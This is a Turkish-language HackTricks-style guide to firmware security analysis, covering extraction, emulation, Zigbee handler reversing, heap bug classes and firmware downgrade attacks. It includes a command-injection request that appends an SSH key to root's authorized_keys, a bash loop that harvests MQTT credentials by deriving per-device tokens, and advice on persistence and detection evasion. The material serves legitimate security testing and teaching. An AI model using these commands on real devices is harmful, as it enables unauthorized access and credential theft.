# Firmware Analizi

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Giriş**

### İlgili kaynaklar


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware, donanım bileşenleri ile kullanıcıların etkileşimde bulunduğu yazılım arasındaki iletişimi yönetip kolaylaştırarak cihazların doğru şekilde çalışmasını sağlayan temel yazılımdır. Kalıcı bellekte saklanır; böylece cihaz, açıldığı andan itibaren gerekli talimatlara erişebilir ve bu da işletim sisteminin başlatılmasını sağlar. Güvenlik açıklarını tespit etmek için Firmware'i incelemek ve potansiyel olarak değiştirmek kritik bir adımdır.<sup>[[2]](#references)[[3]](#references)</sup>

## **Bilgi Toplama**

**Bilgi toplama**, bir cihazın yapısını ve kullandığı teknolojileri anlamada kritik bir ilk adımdır. Bu süreç aşağıdakiler hakkında veri toplamayı içerir:

- CPU mimarisi ve çalıştırdığı işletim sistemi
- Bootloader özellikleri
- Donanım yerleşimi ve veri sayfaları
- Kod tabanı ölçümleri ve kaynak konumları
- Harici kütüphaneler ve lisans türleri
- Güncelleme geçmişi ve mevzuat sertifikaları
- Mimari ve akış diyagramları
- Güvenlik değerlendirmeleri ve tespit edilen güvenlik açıkları

Bu amaçla **open-source intelligence (OSINT)** araçları büyük önem taşır. Ayrıca, mevcut open-source yazılım bileşenlerinin manuel ve otomatik inceleme süreçleriyle analiz edilmesi de değerlidir. [Coverity Scan](https://scan.coverity.com) ve [Semmle’s LGTM](https://lgtm.com/#explore) gibi araçlar, potansiyel sorunları bulmak için kullanılabilecek ücretsiz statik analiz imkanı sunar.

## **Firmware'i Edinme**

Firmware edinme işlemi, her biri farklı bir karmaşıklık düzeyine sahip çeşitli yöntemlerle gerçekleştirilebilir:

- Kaynaktan (**doğrudan**) (geliştiriciler, üreticiler)
- Sağlanan talimatlarla **derleyerek**
- Resmi destek sitelerinden **indirerek**
- Barındırılan Firmware dosyalarını bulmak için **Google dork** sorgularından yararlanarak
- [S3Scanner](https://github.com/sa7mon/S3Scanner) gibi araçlarla **cloud storage**'a doğrudan erişerek
- **Güncellemeleri**, man-in-the-middle teknikleriyle yakalayarak
- **UART**, **JTAG** veya **PICit** gibi bağlantılar üzerinden cihazdan **çıkararak**
- Cihaz iletişimi içindeki güncelleme isteklerini **sniffing** ile izleyerek
- **Hardcoded update endpoint**'lerini tespit edip kullanarak
- Bootloader veya ağ üzerinden **dump alarak**
- Diğer tüm yöntemler başarısız olduğunda, uygun donanım araçlarını kullanarak depolama çipini **çıkarıp okuyarak**

### Yalnızca UART logları: Flash'taki U-Boot env üzerinden root shell'i zorlamak

UART RX yok sayılıyorsa (yalnızca loglar varsa), **U-Boot environment blob**'ını offline olarak **düzenleyerek** yine de bir init shell zorlayabilirsiniz:<sup>[[6]](#references)</sup>

1. SPI flash'ı bir SOIC-8 klipsi ve programlayıcıyla (3.3V) dump edin:
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. U-Boot env partition'ını bulun, `bootargs`'ı `init=/bin/sh` içerecek şekilde düzenleyin ve blob için **U-Boot env CRC32'yi yeniden hesaplayın**.
3. Yalnızca env partition'ını yeniden flash'layın ve yeniden başlatın; UART üzerinde bir shell görünmelidir.

Bu yöntem, bootloader shell'inin devre dışı bırakıldığı ancak env partition'ına harici flash erişimi üzerinden yazılabildiği embedded cihazlarda kullanışlıdır.

## Firmware'i analiz etme

Artık **Firmware'e sahipsiniz**; onu nasıl ele almanız gerektiğini anlamak için hakkında bilgi çıkarmanız gerekir. Bunun için kullanabileceğiniz farklı araçlar vardır:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Bu araçlarla fazla bir şey bulamazsanız, `binwalk -E <bin>` ile imajın **entropy** değerini kontrol edin; entropy düşükse şifrelenmiş olma ihtimali düşüktür. Entropy yüksekse imajın şifrelenmiş olması (veya bir şekilde sıkıştırılmış olması) muhtemeldir.

Ayrıca **firmware içine gömülü dosyaları** çıkarmak için bu araçları kullanabilirsiniz:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Dosyayı incelemek için [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) da kullanılabilir.

### Dosya Sistemini Alma

Daha önce açıklanan `binwalk -ev <bin>` gibi araçlarla **dosya sistemini çıkarmış** olmanız gerekir.\
Binwalk, dosya sistemini genellikle **dosya sistemi türünün adını taşıyan bir klasörün içine** çıkarır; bu türler genellikle şunlardan biridir: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Dosya Sisteminin Manuel Olarak Çıkarılması

Bazen binwalk, imzalarında dosya sisteminin **magic byte** değerini bulundurmaz. Bu durumlarda binwalk kullanarak dosya sisteminin **offset değerini bulun**, sıkıştırılmış dosya sistemini binary içinden **carve edin** ve aşağıdaki adımları kullanarak dosya sistemi türüne göre **manuel olarak çıkarın**.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Squashfs dosya sistemini carve etmek için aşağıdaki **dd command** komutunu çalıştırın.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatif olarak, aşağıdaki komut da çalıştırılabilir.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs (yukarıdaki örnekte kullanılmıştır)

`$ unsquashfs dir.squashfs`

Dosyalar daha sonra "`squashfs-root`" dizininde bulunur.

- CPIO archive dosyaları

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 filesystems için

`$ jefferson rootfsfile.jffs2`

- NAND flash içeren ubifs filesystems için

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware Analizi

Firmware elde edildikten sonra, yapısını ve olası güvenlik açıklarını anlamak için onu ayrıntılı şekilde incelemek önemlidir. Bu süreç, firmware image'ından değerli verileri analiz etmek ve çıkarmak için çeşitli araçların kullanılmasını içerir.

### İlk Analiz Araçları

Binary file'ın ( `<bin>` olarak adlandırılır) ilk incelemesi için bir dizi komut sağlanmıştır. Bu komutlar, file türlerinin belirlenmesine, string'lerin çıkarılmasına, binary verilerin analiz edilmesine ve partition ile filesystem ayrıntılarının anlaşılmasına yardımcı olur:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Görüntünün **şifreleme** durumunu değerlendirmek için `binwalk -E <bin>` ile **entropy** kontrol edilir. Düşük entropy, şifreleme olmadığını gösterirken yüksek entropy olası şifreleme veya sıkıştırmaya işaret eder.

**embedded files** dosyalarını çıkarmak için **file-data-carving-recovery-tools** documentation ve dosya inceleme amacıyla **binvis.io** gibi araçlar ve kaynaklar önerilir.

### Filesystem Çıkarma

`binwalk -ev <bin>` kullanılarak genellikle filesystem çıkarılabilir; bu işlem çoğunlukla filesystem türünün adını taşıyan bir dizine (ör. squashfs, ubifs) yapılır. Ancak **binwalk**, magic bytes eksikliği nedeniyle filesystem türünü tanıyamadığında manuel çıkarma gerekir. Bu işlem, filesystem'ın offset'ini bulmak için `binwalk` kullanmayı ve ardından filesystem'ı carve etmek için `dd` komutunu çalıştırmayı içerir:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Ardından, dosya sistemi türüne (ör. squashfs, cpio, jffs2, ubifs) bağlı olarak içerikleri manuel olarak çıkarmak için farklı komutlar kullanılır.

### Dosya Sistemi Analizi

Dosya sistemi çıkarıldıktan sonra güvenlik açıkları aranmaya başlanır. Güvenli olmayan network daemon'larına, hardcoded credentials bilgilerine, API endpoint'lerine, update server işlevlerine, derlenmemiş code'a, startup script'lerine ve offline analysis için derlenmiş binary'lere dikkat edilir.

**İncelenecek başlıca konumlar** ve **öğeler** şunlardır:

- Kullanıcı credentials bilgileri için **etc/shadow** ve **etc/passwd**
- **etc/ssl** içindeki SSL sertifikaları ve anahtarları
- Potansiyel güvenlik açıkları için configuration ve script dosyaları
- İleri analysis için embedded binary'ler
- Yaygın IoT device web server'ları ve binary'leri

Dosya sistemi içindeki hassas bilgileri ve güvenlik açıklarını ortaya çıkarmaya yardımcı olan çeşitli araçlar vardır:

- Hassas bilgi araması için [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) ve [**Firmwalker**](https://github.com/craigz28/firmwalker)
- Kapsamlı firmware analysis için [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- Static ve dynamic analysis için [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) ve [**EMBA**](https://github.com/e-m-b-a/emba)

### Derlenmiş Binary'ler Üzerinde Security Checks

Dosya sisteminde bulunan hem source code hem de derlenmiş binary'ler güvenlik açıkları açısından dikkatle incelenmelidir. Unix binary'leri için **checksec.sh** ve Windows binary'leri için **PESecurity** gibi araçlar, exploit edilebilecek korumasız binary'leri belirlemeye yardımcı olur.

## Türetilmiş URL token'ları aracılığıyla cloud config ve MQTT credentials bilgilerinin elde edilmesi

Birçok IoT hub, device başına yapılandırmasını şu şekilde görünen bir cloud endpoint'inden alır:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Firmware analysis sırasında `<token>` değerinin, hardcoded bir secret kullanılarak device ID'den yerel olarak türetildiğini görebilirsiniz; örneğin:

- token = MD5( deviceId || STATIC_KEY ) ve uppercase hex olarak gösterilir

Bu tasarım, bir deviceId ve STATIC_KEY'i öğrenen herkesin URL'yi yeniden oluşturmasına ve cloud config'i çekmesine olanak tanır; bu işlem çoğu zaman plaintext MQTT credentials bilgilerini ve topic prefix'lerini açığa çıkarır.

Pratik workflow:

1) UART boot log'larından deviceId'yi çıkarın

- Bir 3.3V UART adapter'ını (TX/RX/GND) bağlayın ve log'ları yakalayın:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Cloud config URL pattern'ini ve broker adresini yazdıran satırları arayın, örneğin:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Firmware'dan STATIC_KEY ve token algoritmasını kurtarma

- Binary'leri Ghidra/radare2'ye yükleyin ve config path (`"/pf/"`) veya MD5 kullanımını arayın.
- Algoritmayı doğrulayın (ör. MD5(deviceId||STATIC_KEY)).
- Token'ı Bash'te türetin ve digest'i büyük harfe dönüştürün:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Cloud config ve MQTT kimlik bilgilerini topla

- URL'yi oluşturun ve curl ile JSON verilerini çekin; sırları ayıklamak için jq ile ayrıştırın:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Plaintext MQTT ve zayıf topic ACL'lerini kötüye kullanma (varsa)

- Elde edilen kimlik bilgilerini kullanarak maintenance topic'lerine abone olun ve hassas olayları arayın:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Tahmin edilebilir cihaz kimliklerini listeleyin (ölçekli olarak, yetkilendirmeyle)

- Birçok ekosistem, satıcı OUI/ürün/tür baytlarının ardından sıralı bir son ek barındırır.
- Aday kimlikler üzerinde yineleme yapabilir, token'lar türetebilir ve yapılandırmaları programlı olarak alabilirsiniz:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notlar
- Mass enumeration gerçekleştirmeden önce daima açık yetkilendirme alın.
- Mümkün olduğunda, hedef donanımı değiştirmeden secret'ları kurtarmak için emülasyon veya static analysis yöntemlerini tercih edin.


Firmware'i emüle etme süreci, bir cihazın çalışmasının veya tek bir programın **dynamic analysis**'ini mümkün kılar. Bu yaklaşım, donanım veya architecture bağımlılıkları nedeniyle zorluklarla karşılaşabilir; ancak root filesystem'ı veya belirli binary'leri, Raspberry Pi gibi matching architecture ve endianness'e sahip bir cihaza ya da önceden oluşturulmuş bir virtual machine'e aktarmak, daha ileri testleri kolaylaştırabilir.

### Tekil Binary'leri Emüle Etme

Tek programları incelemek için programın endianness'ini ve CPU architecture'ını belirlemek kritik öneme sahiptir.

#### MIPS Architecture Örneği

Bir MIPS architecture binary'sini emüle etmek için şu komut kullanılabilir:
```bash
file ./squashfs-root/bin/busybox
```
Ve gerekli emülasyon araçlarını yüklemek için:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
MIPS (big-endian) için `qemu-mips` kullanılır; little-endian binary'ler için ise `qemu-mipsel` tercih edilir.

#### ARM Architecture Emulation

ARM binary'leri için süreç benzerdir; emulation amacıyla `qemu-arm` emulator'ü kullanılır.

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) ve diğer araçlar, full firmware emulation işlemini kolaylaştırarak süreci otomatikleştirir ve dynamic analysis yapılmasına yardımcı olur.

## Dynamic Analysis in Practice

Bu aşamada analysis için gerçek veya emulated bir device environment kullanılır. OS ve filesystem'a shell access korunması önemlidir. Emulation, hardware interactions'ı her zaman kusursuz şekilde taklit etmeyebilir; bu nedenle zaman zaman emulation'ın yeniden başlatılması gerekebilir. Analysis sırasında filesystem yeniden incelenmeli, exposed webpage'ler ve network service'leri exploit edilmeli ve bootloader vulnerabilities araştırılmalıdır. Firmware integrity test'leri, olası backdoor vulnerabilities'larını tespit etmek açısından kritiktir.

## Runtime Analysis Techniques

Runtime analysis, gdb-multiarch, Frida ve Ghidra gibi araçları kullanarak bir process veya binary ile kendi operating environment'ında etkileşime geçmeyi; breakpoint'ler ayarlamayı ve fuzzing ile diğer teknikler aracılığıyla vulnerabilities tespit etmeyi içerir.

Full debugger bulunmayan embedded target'lar için, **statik olarak linklenmiş bir `gdbserver`'ı** cihaza **kopyalayın** ve remotely attach olun:<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

IoT hub’larda RF stack’i genellikle bir **radio MCU** ile Linux userland process’i arasında bölünür. Yararlı bir workflow, yolu eşlemektir:<sup>[[8]](#references)</sup>

1. Havadan iletilen **RF frame**
2. Radio MCU üzerindeki **controller-side parser**
3. Linux’a iletilen **serial/UART text veya TLV protocol** (örneğin `/dev/tty*`)
4. Ana daemon içindeki **application dispatcher**
5. **protocol-specific handler / state machine**

Bu mimari, tek hedef yerine iki reversing hedefi oluşturur. Controller binary radio frame’leri `Group,Command,arg1,arg2,...` gibi bir textual protocol’e dönüştürüyorsa şunları belirleyin:

- **Message group**’larını ve dispatch table’larını
- Hangi message’ların **network**’ten, hangilerinin controller’ın kendisinden gelebileceğini
- Tam **manufacturer-specific discriminator field**’larını (örneğin Zigbee `manufacturer_code` ve custom `cluster_command`)
- Hangi handler’ların yalnızca **commissioning**, discovery veya firmware/model download aşamalarında erişilebilir olduğunu

Özellikle Zigbee için pairing trafiğini yakalayın ve hedefin hâlâ varsayılan **Link Key** `ZigBeeAlliance09` değerine dayanıp dayanmadığını kontrol edin. Böyleyse commissioning trafiğini sniff etmek **Network Key** değerini açığa çıkarabilir. Zigbee 3.0 install code’ları bu exposure’ı azaltır; bu nedenle test edilen cihazın bunları gerçekten enforce edip etmediğini not edin.

### Manufacturer-specific protocol handlers and FSM-gated reachability

Vendor-specific Zigbee/ZCL command’ları, standardized cluster’lara kıyasla genellikle daha iyi bir hedeftir; çünkü daha az battle-tested validation içeren **custom parsing code** ve internal **FSM**’lere ulaşırlar.<sup>[[8]](#references)</sup>

Practical workflow:

- **Vendor-only handler**’ı bulana kadar command dispatcher’ı reverse edin.
- **FSM state**, **event**, **check**, **action** ve **next-state** table’larını geri elde edin.
- Otomatik olarak ilerleyen **transitional state**’leri ve sonunda attacker-controlled state’i resetleyen veya free eden retry/error branch’lerini belirleyin.
- Buggy handler’ın her zaman erişilebilir olduğunu varsaymak yerine, daemon’ı vulnerable state’e getirmek için hangi legitimate protocol exchange’lerinin gerektiğini doğrulayın.

Timing-sensitive protocol’ler için Python framework’ünden packet replay yapmak çok yavaş olabilir. Daha güvenilir bir yaklaşım, doğru **endpoint**’leri, **attribute**’ları ve commissioning timing’ini açığa çıkarabilmek için vendor-grade stack kullanan gerçek donanım (örneğin bir **nRF52840**) üzerinde legitimate device emüle etmektir.

### Fragmented-download bug class in embedded daemons

Embedded daemon’larda tekrarlanan bir firmware bug class, **fragmented blob/model/configuration download** işlemlerinde görülür:<sup>[[8]](#references)</sup>

1. **First fragment** (`offset == 0`), `ctx->total_size` değerini saklar ve `malloc(total_size)` çağrısıyla allocation yapar.
2. Sonraki fragment’lar yalnızca `packet_total_size >= offset + chunk_len` gibi attacker-controlled **packet-local** field’ları validate eder.
3. Copy işlemi, allocation’ın **original size** değerine karşı kontrol yapılmadan `memcpy(&ctx->buffer[offset], chunk, chunk_len)` ile gerçekleştirilir.

Bu durum bir attacker’ın şunları göndermesine olanak tanır:

- Küçük bir heap allocation zorlamak için **small** declared total size içeren ilk valid fragment.
- **Expected offset** değerine, ancak daha büyük bir `chunk_len` değerine sahip sonraki fragment.
- Yeni check’leri karşılayan, fakat başlangıçta allocated buffer’ı yine de overflow eden forged packet-local size.

Vulnerable path commissioning logic’in arkasındaysa exploitation, malformed fragment’ları göndermeden önce hedefi beklenen model-download veya blob-download state’ine getirmek için yeterli **device emulation** içermelidir.

### Protocol-driven `free()` triggers

Embedded daemon’larda heap metadata exploitation’ı tetiklemenin en kolay yolu genellikle "wait for cleanup" değil, **protocol’ün kendi error handling’ini force etmektir**:<sup>[[8]](#references)</sup>

- FSM’i **retry** veya **error** state’lerine geçirmek için malformed follow-up fragment’lar gönderin.
- Daemon’ın **context**’i resetleyip corrupted buffer’ı free etmesini sağlamak için retry threshold’u aşın.
- Process’in ilgisiz nedenlerle crash olmasından önce allocator-side primitive’leri tetiklemek için bu öngörülebilir `free()` işlemini kullanın.

Bu yaklaşım, özellikle embedded Linux’taki **musl/uClibc/dlmalloc-like** allocator’lara karşı yararlıdır; chunk metadata’yı bozmak, unlink/unbin logic’i bir write primitive’e dönüştürebilir. Stable bir pattern, gerçek bin pointer’larını hemen overwrite edip process’i crash ettirmek yerine, allocator traversal’ı **overflowed buffer** içinde hazırlanan **fake chunk**’lara yönlendirmek için bir **size field**’ı bozmaktır.

## Binary Exploitation and Proof-of-Concept

Belirlenen vulnerability’ler için PoC geliştirmek, hedef architecture’ın ve lower-level language’lerde programming’in derinlemesine anlaşılmasını gerektirir. Embedded system’larda binary runtime protection’lar nadirdir; ancak mevcut olduklarında Return Oriented Programming (ROP) gibi teknikler gerekli olabilir.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc, glibc’e benzer fastbin’ler kullanır. Daha sonraki bir large allocation `__malloc_consolidate()` çağrısını tetikleyebilir; bu nedenle herhangi bir fake chunk check’lerden geçmelidir (sane size, `fd = 0` ve surrounding chunk’ların "in use" olarak görülmesi).<sup>[[6]](#references)</sup>
- **Non-PIE binaries under ASLR:** ASLR etkin ancak ana binary **non-PIE** ise, binary içindeki `.data/.bss` adresleri sabittir. Fastbin allocation’ı bir **function pointer table** üzerine yerleştirmek için zaten valid bir heap chunk header’ına benzeyen bir bölgeyi hedefleyebilirsiniz.
- **Parser-stopping NUL:** JSON parse edildiğinde payload içindeki bir `\x00`, parsing’i durdururken stack pivot/ROP chain için trailing attacker-controlled byte’ları koruyabilir.
- **Shellcode via `/proc/self/mem`:** `open("/proc/self/mem")`, `lseek()` ve `write()` çağrılarını yapan bir ROP chain, executable shellcode’u bilinen bir mapping’e yerleştirip oraya jump edebilir.

## Prepared Operating Systems for Firmware Analysis

[AttifyOS](https://github.com/adi0x90/attifyos) ve [EmbedOS](https://github.com/scriptingxss/EmbedOS) gibi operating system’ler, firmware security testing için gerekli araçlarla donatılmış, önceden yapılandırılmış ortamlar sağlar.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS, Internet of Things (IoT) cihazlarının security assessment ve penetration testing işlemlerini gerçekleştirmenize yardımcı olmak için tasarlanmış bir distro’dur. Gerekli tüm araçların yüklü olduğu, önceden yapılandırılmış bir ortam sağlayarak size önemli ölçüde zaman kazandırır.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Firmware security testing araçları önceden yüklenmiş, Ubuntu 18.04 tabanlı embedded security testing operating system.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Bir vendor firmware image’ları için cryptographic signature check’leri uygulasa bile **version rollback (downgrade) protection** sıklıkla atlanır. Boot veya recovery-loader, embedded public key ile yalnızca signature’ı doğruluyor ancak flash edilen image’ın *version*’ını (veya monotonic counter’ını) karşılaştırmıyorsa attacker, hâlâ valid signature taşıyan **older, vulnerable firmware**’ı legitimate şekilde yükleyebilir ve böylece patched vulnerability’leri yeniden kullanılabilir hâle getirebilir.<sup>[[4]](#references)</sup>

Typical attack workflow:

1. **Obtain an older signed image**
* Vendor’ın public download portal’ından, CDN’inden veya support site’ından alın.
* Companion mobile/desktop application’lardan extract edin (ör. bir Android APK içinde `assets/firmware/` altında).
* VirusTotal, Internet archive’ları, forumlar vb. third-party repository’lerden retrieve edin.
2. Image’ı herhangi bir exposed update channel üzerinden cihaza **upload veya serve edin**:
* Web UI, mobile-app API, USB, TFTP, MQTT vb.
* Birçok consumer IoT device, Base64-encoded firmware blob’larını kabul eden, bunları server-side decode eden ve recovery/upgrade işlemini tetikleyen *unauthenticated* HTTP(S) endpoint’leri expose eder.
3. Downgrade sonrasında newer release’te patched edilmiş bir vulnerability’yi exploit edin (örneğin daha sonra eklenen bir command-injection filter).
4. Persistence elde edildikten sonra detection’dan kaçınmak için isteğe bağlı olarak latest image’ı yeniden flash edin veya update’leri disable edin.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Güvenlik açığı bulunan (downgrade edilmiş) firmware'de `md5` parametresi herhangi bir sanitisation uygulanmadan doğrudan bir shell command'ine birleştirilir ve bu durum keyfi command'lerin injection edilmesine olanak tanır (burada SSH key tabanlı root erişimini etkinleştirmek için). Daha sonraki firmware sürümleri temel bir karakter filtresi ekledi, ancak downgrade korumasının bulunmaması düzeltmeyi etkisiz kılar.<sup>[[4]](#references)</sup>

### Mobile App'lerden Firmware Çıkarma

Birçok vendor, companion mobile application'larına tam firmware imajlarını dahil eder; böylece application, cihazı Bluetooth/Wi-Fi üzerinden güncelleyebilir. Bu paketler genellikle APK/APEX içinde `assets/fw/` veya `res/raw/` gibi path'lerde şifrelenmemiş olarak saklanır. `apktool`, `ghidra` veya yalnızca `unzip` gibi araçlar, fiziksel donanıma dokunmadan imzalı imajları çıkarmanıza olanak tanır.<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### A/B slot tasarımlarında yalnızca updater kapsamındaki anti-rollback bypass

Bazı vendor'lar anti-downgrade **ratchet** uygular, ancak bunu yalnızca *updater* mantığı içinde kullanır (örneğin CAN üzerinden bir UDS rutini, bir recovery komutu veya bir userspace OTA agent). **Bootloader** daha sonra yalnızca image signature/CRC kontrolü yapar ve partition table'a veya slot metadata'sına güvenirse rollback protection yine bypass edilebilir.<sup>[[7]](#references)</sup>

Tipik zayıf tasarım:

- Firmware metadata'sı hem bir version descriptor hem de bir **security ratchet** / monotonic counter içerir.
- Updater, image ratchet değerini persistent storage'da saklanan değerle karşılaştırır ve daha eski signed image'ları reddeder.
- Bootloader bu ratchet değerini **parse** etmez; boot etmeden önce yalnızca header, CRC ve signature doğrulaması yapar.
- Slot activation ayrı olarak bir partition table'da veya slot başına generation counter ile saklanır ve doğrulanmış exact firmware digest'e cryptographically bound değildir.

Bu durum dual-slot sistemlerde bir **validate-one-image / boot-another-image** primitive'i oluşturur. Saldırgan, updater'a güncel bir signed image kullanarak slot B'yi bir sonraki boot target olarak işaretletebilir ve reboot öncesinde slot B'nin üzerine yazabilirse bootloader, yalnızca önceden commit edilmiş slot metadata'sına güvendiği için downgraded image'ı yine boot edebilir.

Yaygın abuse pattern:

1. **Current signed** firmware'ı passive slot'a upload edin ve layout'un bu slotu bir sonraki active slot olarak işaretlemesini sağlamak için normal validation/switch routine'i çalıştırın.
2. **Henüz reboot etmeyin**. Aynı session içinde slot-preparation/erase routine'ine yeniden girin.
3. Updater'ın, az önce promote edilen **aynı physical slot'u** erase etmesini sağlamak için stale boot-state veya stale slot-selection logic'i abuse edin.
4. Bu slota **daha eski ancak hâlâ signed** bir firmware yazın.
5. Ratchet'i uygulayan validation routine'ini atlayın ve doğrudan reboot edin.
6. Bootloader promote edilen slotu seçer, yalnızca signature/integrity doğrulaması yapar ve eski image'ı boot eder.

A/B update implementation'larını reverse ederken aranacak noktalar:

- Başarılı bir switch sonrasında yenilenmeyen **boot-time flags** üzerinden türetilen slot selection.
- **Current committed layout** yerine stale state'e göre slot erase eden `prepare_passive_slot()`-style bir routine.
- Yalnızca bir **generation counter** / active flag artıran ve doğrulanmış image hash'ini saklamayan `part_write_layout()`-style bir function.
- Userspace veya updater code içinde implement edilmiş, ancak ROM / bootloader / secure boot stages içinde bulunmayan ratchet checks.
- İçeriği silinip yeniden yazıldıktan sonra bile slotu bootable olarak işaretli bırakan erase veya recovery routines.

### Update Logic'i Değerlendirme Checklist'i

* *Update endpoint*'in transport/authentication katmanı yeterince korunuyor mu (TLS + authentication)?
* Device, flashing işleminden önce **version numbers** veya **monotonic anti-rollback counter** karşılaştırıyor mu?
* Image, secure boot chain içinde doğrulanıyor mu (örneğin signatures ROM code tarafından kontrol ediliyor mu)?
* **Bootloader**, yalnızca signature/CRC kontrol etmek yerine updater ile **aynı ratchet'i enforce ediyor mu**?
* Slot activation metadata'sı **validated firmware digest/version'a bound** mı, yoksa promotion sonrasında bir slot değiştirilebilir mi?
* Bir slot switch başarılı olduktan sonra device reboot etmeye zorlanıyor mu, yoksa sonraki update/erase routines aynı session içinde hâlâ erişilebilir mi?
* Userland code ek sanity checks gerçekleştiriyor mu (örneğin allowed partition map, model number)?
* *Partial* veya *backup* update flows aynı validation logic'i yeniden kullanıyor mu?

> 💡  Yukarıdakilerden herhangi biri eksikse platform muhtemelen rollback attacks'e karşı vulnerable'dır.

## Pratik yapmak için vulnerable firmware

Firmware'daki vulnerabilities'ı keşfetme pratiği yapmak için başlangıç noktası olarak aşağıdaki vulnerable firmware projects'lerini kullanın.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
